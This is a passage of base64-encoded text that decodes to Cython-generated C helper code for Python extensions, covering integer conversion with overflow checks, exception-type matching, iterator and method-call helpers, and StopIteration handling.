CAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UKGludCwgbG9uZywgLShsb25nKSAoKCgoKCgoKCh1bnNpZ25lZCBsb25nKWRpZ2l0c1szXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1swXSkpKQogICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKCg4ICogc2l6ZW9mKGludCkgLSAxID4gNCAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAoaW50KSAoKChpbnQpLTEpKigoKCgoKCgoKGludClkaWdpdHNbM10pIDw8IFB5TG9uZ19TSElGVCkgfCAoaW50KWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8IChpbnQpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGludClkaWdpdHNbMF0pKSk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICBjYXNlIDQ6CiAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKGludCkgPiAzICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YodW5zaWduZWQgbG9uZykgPiA0ICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlQoaW50LCB1bnNpZ25lZCBsb25nLCAoKCgoKCgoKCh1bnNpZ25lZCBsb25nKWRpZ2l0c1szXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1swXSkpKQogICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKCg4ICogc2l6ZW9mKGludCkgLSAxID4gNCAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAoaW50KSAoKCgoKCgoKCgoaW50KWRpZ2l0c1szXSkgPDwgUHlMb25nX1NISUZUKSB8IChpbnQpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGludClkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAoaW50KWRpZ2l0c1swXSkpKTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgfQogICAgICAgIH0KI2VuZGlmCiAgICAgICAgaWYgKChzaXplb2YoaW50KSA8PSBzaXplb2YobG9uZykpKSB7CiAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UX0VYQyhpbnQsIGxvbmcsIFB5TG9uZ19Bc0xvbmcoeCkpCiNpZmRlZiBIQVZFX0xPTkdfTE9ORwogICAgICAgIH0gZWxzZSBpZiAoKHNpemVvZihpbnQpIDw9IHNpemVvZihQWV9MT05HX0xPTkcpKSkgewogICAgICAgICAgICBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVF9FWEMoaW50LCBQWV9MT05HX0xPTkcsIFB5TG9uZ19Bc0xvbmdMb25nKHgpKQojZW5kaWYKICAgICAgICB9CiAgICB9CiAgICB7CiAgICAgICAgaW50IHZhbDsKICAgICAgICBpbnQgcmV0ID0gLTE7CiNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMEE2ICYmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgICAgICAgUHlfc3NpemVfdCBieXRlc19jb3BpZWQgPSBQeUxvbmdfQXNOYXRpdmVCeXRlcygKICAgICAgICAgICAgeCwgJnZhbCwgc2l6ZW9mKHZhbCksIFB5X0FTTkFUSVZFQllURVNfTkFUSVZFX0VORElBTiB8IChpc191bnNpZ25lZCA/IFB5X0FTTkFUSVZFQllURVNfVU5TSUdORURfQlVGRkVSIHwgUHlfQVNOQVRJVkVCWVRFU19SRUpFQ1RfTkVHQVRJVkUgOiAwKSk7CiAgICAgICAgaWYgKHVubGlrZWx5KGJ5dGVzX2NvcGllZCA9PSAtMSkpIHsKICAgICAgICB9IGVsc2UgaWYgKHVubGlrZWx5KGJ5dGVzX2NvcGllZCA+IChQeV9zc2l6ZV90KSBzaXplb2YodmFsKSkpIHsKICAgICAgICAgICAgZ290byByYWlzZV9vdmVyZmxvdzsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICByZXQgPSAwOwogICAgICAgIH0KI2VsaWYgUFlfVkVSU0lPTl9IRVggPCAweDAzMGQwMDAwICYmICEoQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZIHx8IENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkpIHx8IGRlZmluZWQoX1B5TG9uZ19Bc0J5dGVBcnJheSkKICAgICAgICBpbnQgb25lID0gMTsgaW50IGlzX2xpdHRsZSA9IChpbnQpKih1bnNpZ25lZCBjaGFyICopJm9uZTsKICAgICAgICB1bnNpZ25lZCBjaGFyICpieXRlcyA9ICh1bnNpZ25lZCBjaGFyICopJnZhbDsKICAgICAgICByZXQgPSBfUHlMb25nX0FzQnl0ZUFycmF5KChQeUxvbmdPYmplY3QgKil4LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBieXRlcywgc2l6ZW9mKHZhbCksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlzX2xpdHRsZSwgIWlzX3Vuc2lnbmVkKTsKI2Vsc2UKICAgICAgICBQeU9iamVjdCAqdjsKICAgICAgICBQeU9iamVjdCAqc3RlcHZhbCA9IE5VTEwsICptYXNrID0gTlVMTCwgKnNoaWZ0ID0gTlVMTDsKICAgICAgICBpbnQgYml0cywgcmVtYWluaW5nX2JpdHMsIGlzX25lZ2F0aXZlID0gMDsKICAgICAgICBpbnQgY2h1bmtfc2l6ZSA9IChzaXplb2YobG9uZykgPCA4KSA/IDMwIDogNjI7CiAgICAgICAgaWYgKGxpa2VseShQeUxvbmdfQ2hlY2tFeGFjdCh4KSkpIHsKICAgICAgICAgICAgdiA9IF9fUHl4X05ld1JlZih4KTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICB2ID0gUHlOdW1iZXJfTG9uZyh4KTsKICAgICAgICAgICAgaWYgKHVubGlrZWx5KCF2KSkgcmV0dXJuIChpbnQpIC0xOwogICAgICAgICAgICBhc3NlcnQoUHlMb25nX0NoZWNrRXhhY3QodikpOwogICAgICAgIH0KICAgICAgICB7CiAgICAgICAgICAgIGludCByZXN1bHQgPSBQeU9iamVjdF9SaWNoQ29tcGFyZUJvb2wodiwgUHlfRmFsc2UsIFB5X0xUKTsKICAgICAgICAgICAgaWYgKHVubGlrZWx5KHJlc3VsdCA8IDApKSB7CiAgICAgICAgICAgICAgICBQeV9ERUNSRUYodik7CiAgICAgICAgICAgICAgICByZXR1cm4gKGludCkgLTE7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaXNfbmVnYXRpdmUgPSByZXN1bHQgPT0gMTsKICAgICAgICB9CiAgICAgICAgaWYgKGlzX3Vuc2lnbmVkICYmIHVubGlrZWx5KGlzX25lZ2F0aXZlKSkgewogICAgICAgICAgICBQeV9ERUNSRUYodik7CiAgICAgICAgICAgIGdvdG8gcmFpc2VfbmVnX292ZXJmbG93OwogICAgICAgIH0gZWxzZSBpZiAoaXNfbmVnYXRpdmUpIHsKICAgICAgICAgICAgc3RlcHZhbCA9IFB5TnVtYmVyX0ludmVydCh2KTsKICAgICAgICAgICAgUHlfREVDUkVGKHYpOwogICAgICAgICAgICBpZiAodW5saWtlbHkoIXN0ZXB2YWwpKQogICAgICAgICAgICAgICAgcmV0dXJuIChpbnQpIC0xOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIHN0ZXB2YWwgPSB2OwogICAgICAgIH0KICAgICAgICB2ID0gTlVMTDsKICAgICAgICB2YWwgPSAoaW50KSAwOwogICAgICAgIG1hc2sgPSBQeUxvbmdfRnJvbUxvbmcoKDFMIDw8IGNodW5rX3NpemUpIC0gMSk7IGlmICh1bmxpa2VseSghbWFzaykpIGdvdG8gZG9uZTsKICAgICAgICBzaGlmdCA9IFB5TG9uZ19Gcm9tTG9uZyhjaHVua19zaXplKTsgaWYgKHVubGlrZWx5KCFzaGlmdCkpIGdvdG8gZG9uZTsKICAgICAgICBmb3IgKGJpdHMgPSAwOyBiaXRzIDwgKGludCkgc2l6ZW9mKGludCkgKiA4IC0gY2h1bmtfc2l6ZTsgYml0cyArPSBjaHVua19zaXplKSB7CiAgICAgICAgICAgIFB5T2JqZWN0ICp0bXAsICpkaWdpdDsKICAgICAgICAgICAgbG9uZyBpZGlnaXQ7CiAgICAgICAgICAgIGRpZ2l0ID0gUHlOdW1iZXJfQW5kKHN0ZXB2YWwsIG1hc2spOwogICAgICAgICAgICBpZiAodW5saWtlbHkoIWRpZ2l0KSkgZ290byBkb25lOwogICAgICAgICAgICBpZGlnaXQgPSBQeUxvbmdfQXNMb25nKGRpZ2l0KTsKICAgICAgICAgICAgUHlfREVDUkVGKGRpZ2l0KTsKICAgICAgICAgICAgaWYgKHVubGlrZWx5KGlkaWdpdCA8IDApKSBnb3RvIGRvbmU7CiAgICAgICAgICAgIHZhbCB8PSAoKGludCkgaWRpZ2l0KSA8PCBiaXRzOwogICAgICAgICAgICB0bXAgPSBQeU51bWJlcl9Sc2hpZnQoc3RlcHZhbCwgc2hpZnQpOwogICAgICAgICAgICBpZiAodW5saWtlbHkoIXRtcCkpIGdvdG8gZG9uZTsKICAgICAgICAgICAgUHlfREVDUkVGKHN0ZXB2YWwpOyBzdGVwdmFsID0gdG1wOwogICAgICAgIH0KICAgICAgICBQeV9ERUNSRUYoc2hpZnQpOyBzaGlmdCA9IE5VTEw7CiAgICAgICAgUHlfREVDUkVGKG1hc2spOyBtYXNrID0gTlVMTDsKICAgICAgICB7CiAgICAgICAgICAgIGxvbmcgaWRpZ2l0ID0gUHlMb25nX0FzTG9uZyhzdGVwdmFsKTsKICAgICAgICAgICAgaWYgKHVubGlrZWx5KGlkaWdpdCA8IDApKSBnb3RvIGRvbmU7CiAgICAgICAgICAgIHJlbWFpbmluZ19iaXRzID0gKChpbnQpIHNpemVvZihpbnQpICogOCkgLSBiaXRzIC0gKGlzX3Vuc2lnbmVkID8gMCA6IDEpOwogICAgICAgICAgICBpZiAodW5saWtlbHkoaWRpZ2l0ID49ICgxTCA8PCByZW1haW5pbmdfYml0cykpKQogICAgICAgICAgICAgICAgZ290byByYWlzZV9vdmVyZmxvdzsKICAgICAgICAgICAgdmFsIHw9ICgoaW50KSBpZGlnaXQpIDw8IGJpdHM7CiAgICAgICAgfQogICAgICAgIGlmICghaXNfdW5zaWduZWQpIHsKICAgICAgICAgICAgaWYgKHVubGlrZWx5KHZhbCAmICgoKGludCkgMSkgPDwgKHNpemVvZihpbnQpICogOCAtIDEpKSkpCiAgICAgICAgICAgICAgICBnb3RvIHJhaXNlX292ZXJmbG93OwogICAgICAgICAgICBpZiAoaXNfbmVnYXRpdmUpCiAgICAgICAgICAgICAgICB2YWwgPSB+dmFsOwogICAgICAgIH0KICAgICAgICByZXQgPSAwOwogICAgZG9uZToKICAgICAgICBQeV9YREVDUkVGKHNoaWZ0KTsKICAgICAgICBQeV9YREVDUkVGKG1hc2spOwogICAgICAgIFB5X1hERUNSRUYoc3RlcHZhbCk7CiNlbmRpZgogICAgICAgIGlmICh1bmxpa2VseShyZXQpKQogICAgICAgICAgICByZXR1cm4gKGludCkgLTE7CiAgICAgICAgcmV0dXJuIHZhbDsKICAgIH0KcmFpc2Vfb3ZlcmZsb3c6CiAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfT3ZlcmZsb3dFcnJvciwKICAgICAgICAidmFsdWUgdG9vIGxhcmdlIHRvIGNvbnZlcnQgdG8gaW50Iik7CiAgICByZXR1cm4gKGludCkgLTE7CnJhaXNlX25lZ19vdmVyZmxvdzoKICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19PdmVyZmxvd0Vycm9yLAogICAgICAgICJjYW4ndCBjb252ZXJ0IG5lZ2F0aXZlIHZhbHVlIHRvIGludCIpOwogICAgcmV0dXJuIChpbnQpIC0xOwp9CgoKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTgpzdGF0aWMgaW50IF9fUHl4X0luQmFzZXMoUHlUeXBlT2JqZWN0ICphLCBQeVR5cGVPYmplY3QgKmIpIHsKICAgIHdoaWxlIChhKSB7CiAgICAgICAgYSA9IF9fUHl4X1B5VHlwZV9HZXRTbG90KGEsIHRwX2Jhc2UsIFB5VHlwZU9iamVjdCopOwogICAgICAgIGlmIChhID09IGIpCiAgICAgICAgICAgIHJldHVybiAxOwogICAgfQogICAgcmV0dXJuIGIgPT0gJlB5QmFzZU9iamVjdF9UeXBlOwp9CnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9Jc1N1YnR5cGUoUHlUeXBlT2JqZWN0ICphLCBQeVR5cGVPYmplY3QgKmIpIHsKICAgIFB5T2JqZWN0ICptcm87CiAgICBpZiAoYSA9PSBiKSByZXR1cm4gMTsKICAgIG1ybyA9IGEtPnRwX21ybzsKICAgIGlmIChsaWtlbHkobXJvKSkgewogICAgICAgIFB5X3NzaXplX3QgaSwgbjsKICAgICAgICBuID0gUHlUdXBsZV9HRVRfU0laRShtcm8pOwogICAgICAgIGZvciAoaSA9IDA7IGkgPCBuOyBpKyspIHsKICAgICAgICAgICAgaWYgKFB5VHVwbGVfR0VUX0lURU0obXJvLCBpKSA9PSAoUHlPYmplY3QgKiliKQogICAgICAgICAgICAgICAgcmV0dXJuIDE7CiAgICAgICAgfQogICAgICAgIHJldHVybiAwOwogICAgfQogICAgcmV0dXJuIF9fUHl4X0luQmFzZXMoYSwgYik7Cn0Kc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X0lzQW55U3VidHlwZTIoUHlUeXBlT2JqZWN0ICpjbHMsIFB5VHlwZU9iamVjdCAqYSwgUHlUeXBlT2JqZWN0ICpiKSB7CiAgICBQeU9iamVjdCAqbXJvOwogICAgaWYgKGNscyA9PSBhIHx8IGNscyA9PSBiKSByZXR1cm4gMTsKICAgIG1ybyA9IGNscy0+dHBfbXJvOwogICAgaWYgKGxpa2VseShtcm8pKSB7CiAgICAgICAgUHlfc3NpemVfdCBpLCBuOwogICAgICAgIG4gPSBQeVR1cGxlX0dFVF9TSVpFKG1ybyk7CiAgICAgICAgZm9yIChpID0gMDsgaSA8IG47IGkrKykgewogICAgICAgICAgICBQeU9iamVjdCAqYmFzZSA9IFB5VHVwbGVfR0VUX0lURU0obXJvLCBpKTsKICAgICAgICAgICAgaWYgKGJhc2UgPT0gKFB5T2JqZWN0ICopYSB8fCBiYXNlID09IChQeU9iamVjdCAqKWIpCiAgICAgICAgICAgICAgICByZXR1cm4gMTsKICAgICAgICB9CiAgICAgICAgcmV0dXJuIDA7CiAgICB9CiAgICByZXR1cm4gX19QeXhfSW5CYXNlcyhjbHMsIGEpIHx8IF9fUHl4X0luQmFzZXMoY2xzLCBiKTsKfQpzdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfaW5uZXJfUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzMihQeU9iamVjdCAqZXJyLCBQeU9iamVjdCogZXhjX3R5cGUxLCBQeU9iamVjdCAqZXhjX3R5cGUyKSB7CiAgICBpZiAoZXhjX3R5cGUxKSB7CiAgICAgICAgcmV0dXJuIF9fUHl4X0lzQW55U3VidHlwZTIoKFB5VHlwZU9iamVjdCopZXJyLCAoUHlUeXBlT2JqZWN0KilleGNfdHlwZTEsIChQeVR5cGVPYmplY3QqKWV4Y190eXBlMik7CiAgICB9IGVsc2UgewogICAgICAgIHJldHVybiBfX1B5eF9Jc1N1YnR5cGUoKFB5VHlwZU9iamVjdCopZXJyLCAoUHlUeXBlT2JqZWN0KilleGNfdHlwZTIpOwogICAgfQp9CnN0YXRpYyBpbnQgX19QeXhfUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzVHVwbGUoUHlPYmplY3QgKmV4Y190eXBlLCBQeU9iamVjdCAqdHVwbGUpIHsKICAgIFB5X3NzaXplX3QgaSwgbjsKICAgIGFzc2VydChQeUV4Y2VwdGlvbkNsYXNzX0NoZWNrKGV4Y190eXBlKSk7CiAgICBuID0gUHlUdXBsZV9HRVRfU0laRSh0dXBsZSk7CiAgICBmb3IgKGk9MDsgaTxuOyBpKyspIHsKICAgICAgICBpZiAoZXhjX3R5cGUgPT0gUHlUdXBsZV9HRVRfSVRFTSh0dXBsZSwgaSkpIHJldHVybiAxOwogICAgfQogICAgZm9yIChpPTA7IGk8bjsgaSsrKSB7CiAgICAgICAgUHlPYmplY3QgKnQgPSBQeVR1cGxlX0dFVF9JVEVNKHR1cGxlLCBpKTsKICAgICAgICBpZiAobGlrZWx5KFB5RXhjZXB0aW9uQ2xhc3NfQ2hlY2sodCkpKSB7CiAgICAgICAgICAgIGlmIChfX1B5eF9pbm5lcl9QeUVycl9HaXZlbkV4Y2VwdGlvbk1hdGNoZXMyKGV4Y190eXBlLCBOVUxMLCB0KSkgcmV0dXJuIDE7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICB9CiAgICB9CiAgICByZXR1cm4gMDsKfQpzdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzKFB5T2JqZWN0ICplcnIsIFB5T2JqZWN0KiBleGNfdHlwZSkgewogICAgaWYgKGxpa2VseShlcnIgPT0gZXhjX3R5cGUpKSByZXR1cm4gMTsKICAgIGlmIChsaWtlbHkoUHlFeGNlcHRpb25DbGFzc19DaGVjayhlcnIpKSkgewogICAgICAgIGlmIChsaWtlbHkoUHlFeGNlcHRpb25DbGFzc19DaGVjayhleGNfdHlwZSkpKSB7CiAgICAgICAgICAgIHJldHVybiBfX1B5eF9pbm5lcl9QeUVycl9HaXZlbkV4Y2VwdGlvbk1hdGNoZXMyKGVyciwgTlVMTCwgZXhjX3R5cGUpOwogICAgICAgIH0gZWxzZSBpZiAobGlrZWx5KFB5VHVwbGVfQ2hlY2soZXhjX3R5cGUpKSkgewogICAgICAgICAgICByZXR1cm4gX19QeXhfUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzVHVwbGUoZXJyLCBleGNfdHlwZSk7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICB9CiAgICB9CiAgICByZXR1cm4gUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzKGVyciwgZXhjX3R5cGUpOwp9CnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9QeUVycl9HaXZlbkV4Y2VwdGlvbk1hdGNoZXMyKFB5T2JqZWN0ICplcnIsIFB5T2JqZWN0ICpleGNfdHlwZTEsIFB5T2JqZWN0ICpleGNfdHlwZTIpIHsKICAgIGFzc2VydChQeUV4Y2VwdGlvbkNsYXNzX0NoZWNrKGV4Y190eXBlMSkpOwogICAgYXNzZXJ0KFB5RXhjZXB0aW9uQ2xhc3NfQ2hlY2soZXhjX3R5cGUyKSk7CiAgICBpZiAobGlrZWx5KGVyciA9PSBleGNfdHlwZTEgfHwgZXJyID09IGV4Y190eXBlMikpIHJldHVybiAxOwogICAgaWYgKGxpa2VseShQeUV4Y2VwdGlvbkNsYXNzX0NoZWNrKGVycikpKSB7CiAgICAgICAgcmV0dXJuIF9fUHl4X2lubmVyX1B5RXJyX0dpdmVuRXhjZXB0aW9uTWF0Y2hlczIoZXJyLCBleGNfdHlwZTEsIGV4Y190eXBlMik7CiAgICB9CiAgICByZXR1cm4gKFB5RXJyX0dpdmVuRXhjZXB0aW9uTWF0Y2hlcyhlcnIsIGV4Y190eXBlMSkgfHwgUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzKGVyciwgZXhjX3R5cGUyKSk7Cn0KI2VuZGlmCgoKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgJiYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA8IDB4MDMwQTAwMDAKc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9HZXRCdWlsdGluTmV4dF9MaW1pdGVkQVBJKHZvaWQpIHsKICAgIGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19QeXhfR2V0QnVpbHRpbk5leHRfTGltaXRlZEFQSV9jYWNoZSkpCiAgICAgICAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19QeXhfR2V0QnVpbHRpbk5leHRfTGltaXRlZEFQSV9jYWNoZSA9IF9fUHl4X0dldEJ1aWx0aW5OYW1lKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9uZXh0KTsKICAgIHJldHVybiBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX1B5eF9HZXRCdWlsdGluTmV4dF9MaW1pdGVkQVBJX2NhY2hlOwp9CiNlbmRpZgpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqX19QeXhfUHlJdGVyX05leHRfUGxhaW4oUHlPYmplY3QgKml0ZXJhdG9yKSB7CiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJICYmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPCAweDAzMEEwMDAwCiAgICBQeU9iamVjdCAqcmVzdWx0OwogICAgUHlPYmplY3QgKm5leHQgPSBfX1B5eF9HZXRCdWlsdGluTmV4dF9MaW1pdGVkQVBJKCk7CiAgICBpZiAodW5saWtlbHkoIW5leHQpKSByZXR1cm4gTlVMTDsKICAgIHJlc3VsdCA9IFB5T2JqZWN0X0NhbGxGdW5jdGlvbk9iakFyZ3MobmV4dCwgaXRlcmF0b3IsIE5VTEwpOwogICAgcmV0dXJuIHJlc3VsdDsKI2Vsc2UKICAgICh2b2lkKV9fUHl4X0dldEJ1aWx0aW5OYW1lOyAvLyBvbmx5IGZvciBlYXJseSBsaW1pdGVkIEFQSQogICAgaXRlcm5leHRmdW5jIGl0ZXJuZXh0ID0gX19QeXhfUHlPYmplY3RfR2V0SXRlck5leHRGdW5jKGl0ZXJhdG9yKTsKICAgIGFzc2VydChpdGVybmV4dCk7CiAgICByZXR1cm4gaXRlcm5leHQoaXRlcmF0b3IpOwojZW5kaWYKfQoKCnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeU9iamVjdF9DYWxsMkFyZ3MoUHlPYmplY3QqIGZ1bmN0aW9uLCBQeU9iamVjdCogYXJnMSwgUHlPYmplY3QqIGFyZzIpIHsKICAgIFB5T2JqZWN0ICphcmdzWzNdID0ge05VTEwsIGFyZzEsIGFyZzJ9OwogICAgcmV0dXJuIF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKGZ1bmN0aW9uLCBhcmdzKzEsIDIgfCBfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpOwp9CgoKI2lmICEoQ1lUSE9OX1ZFQ1RPUkNBTEwgJiYgKF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPj0gMHgwMzBDMDAwMCB8fCAoIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgJiYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA5MDAwMCkpKQpzdGF0aWMgUHlPYmplY3QqIF9fUHl4X19QeU9iamVjdF9DYWxsTWV0aG9kMShQeU9iamVjdCogbWV0aG9kLCBQeU9iamVjdCogYXJnKSB7CiAgICBQeU9iamVjdCAqcmVzdWx0ID0gX19QeXhfUHlPYmplY3RfQ2FsbE9uZUFyZyhtZXRob2QsIGFyZyk7CiAgICBQeV9ERUNSRUYobWV0aG9kKTsKICAgIHJldHVybiByZXN1bHQ7Cn0KI2VuZGlmCnN0YXRpYyBQeU9iamVjdCogX19QeXhfUHlPYmplY3RfQ2FsbE1ldGhvZDEoUHlPYmplY3QqIG9iaiwgUHlPYmplY3QqIG1ldGhvZF9uYW1lLCBQeU9iamVjdCogYXJnKSB7CiNpZiBDWVRIT05fVkVDVE9SQ0FMTCAmJiAoX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA+PSAweDAzMEMwMDAwIHx8ICghQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAmJiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMDkwMDAwKSkKICAgIFB5T2JqZWN0ICphcmdzWzJdID0ge29iaiwgYXJnfTsKICAgICh2b2lkKSBfX1B5eF9QeU9iamVjdF9HZXRNZXRob2Q7CiAgICAodm9pZCkgX19QeXhfUHlPYmplY3RfQ2FsbE9uZUFyZzsKICAgICh2b2lkKSBfX1B5eF9QeU9iamVjdF9DYWxsMkFyZ3M7CiAgICByZXR1cm4gUHlPYmplY3RfVmVjdG9yY2FsbE1ldGhvZChtZXRob2RfbmFtZSwgYXJncywgMiB8IFBZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCwgTlVMTCk7CiNlbHNlCiAgICBQeU9iamVjdCAqbWV0aG9kID0gTlVMTCwgKnJlc3VsdDsKICAgIGludCBpc19tZXRob2QgPSBfX1B5eF9QeU9iamVjdF9HZXRNZXRob2Qob2JqLCBtZXRob2RfbmFtZSwgJm1ldGhvZCk7CiAgICBpZiAobGlrZWx5KGlzX21ldGhvZCkpIHsKICAgICAgICByZXN1bHQgPSBfX1B5eF9QeU9iamVjdF9DYWxsMkFyZ3MobWV0aG9kLCBvYmosIGFyZyk7CiAgICAgICAgUHlfREVDUkVGKG1ldGhvZCk7CiAgICAgICAgcmV0dXJuIHJlc3VsdDsKICAgIH0KICAgIGlmICh1bmxpa2VseSghbWV0aG9kKSkgcmV0dXJuIE5VTEw7CiAgICByZXR1cm4gX19QeXhfX1B5T2JqZWN0X0NhbGxNZXRob2QxKG1ldGhvZCwgYXJnKTsKI2VuZGlmCn0KCgpzdGF0aWMgdm9pZCBfX1B5eF9fUmV0dXJuV2l0aFN0b3BJdGVyYXRpb24oUHlPYmplY3QqIHZhbHVlLCBpbnQgYXN5bmMpOwpzdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X1JldHVybldpdGhTdG9wSXRlcmF0aW9uKFB5T2JqZWN0KiB2YWx1ZSwgaW50IGFzeW5jLCBpbnQgaXRlcm5leHQpIHsKICAgIGlmICh2YWx1ZSA9PSBQeV9Ob25lKSB7CiAgICAgICAgaWYgKGFzeW5jIHx8ICFpdGVybmV4dCkKICAgICAgICAgICAgUHlFcnJfU2V0Tm9uZShhc3luYyA/IFB5RXhjX1N0b3BBc3luY0l0ZXJhdGlvbiA6IFB5RXhjX1N0b3BJdGVyYXRpb24pOwogICAgICAgIHJldHVybjsKICAgIH0KICAgIF9fUHl4X19SZXR1cm5XaXRoU3RvcEl0ZXJhdGlvbih2YWx1ZSwgYXN5bmMpOwp9CnN0YXRpYyB2b2lkIF9fUHl4X19SZXR1cm5XaXRoU3RvcEl0ZXJhdGlvbihQeU9iamVjdCogdmFsdWUsIGludCBhc3luYykgewojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OCiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmUKI2VuZGlmCiAgICBQeU9iamVjdCAqZXhjOwogICAgUHlPYmplY3QgKmV4Y190eXBlID0gYXN5bmMgPyBQeUV4Y19TdG9wQXN5bmNJdGVyYXRpb24gOiBQeUV4Y19TdG9wSXRlcmF0aW9uOwojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OCiAgICBpZiAoKFBZX1ZFUlNJT05fSEVYID49ICgweDAzMEMwMEE2KSkgfHwgdW5saWtlbHkoUHlUdXBsZV9DaGVjayh2YWx1ZSkgfHwgUHlFeGNlcHRpb25JbnN0YW5jZV9DaGVjayh2YWx1ZSkpKSB7CiAgICAgICAgaWYgKFBZX1ZFUlNJT05fSEVYID49ICgweDAzMGUwMEExKSkgewogICAgICAgICAgICBleGMgPSBfX1B5eF9QeU9iamVjdF9DYWxsT25lQXJnKGV4Y190eXBlLCB2YWx1ZSk7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgUHlPYmplY3QgKmFyZ3NfdHVwbGUgPSBQeVR1cGxlX05ldygxKTsKICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFhcmdzX3R1cGxlKSkgcmV0dXJuOwogICAgICAgICAgICBQeV9JTkNSRUYodmFsdWUpOwogICAgICAgICAgICBQeVR1cGxlX1NFVF9JVEVNKGFyZ3NfdHVwbGUsIDAsIHZhbHVlKTsKICAgICAgICAgICAgZXhjID0gUHlPYmplY3RfQ2FsbChleGNfdHlwZSwgYXJnc190dXBsZSwgTlVMTCk7CiAgICAgICAgICAgIFB5X0RFQ1JFRihhcmdzX3R1cGxlKTsKICAgICAgICB9CiAgICAgICAgaWYgKHVubGlrZWx5KCFleGMpKSByZXR1cm47CiAgICB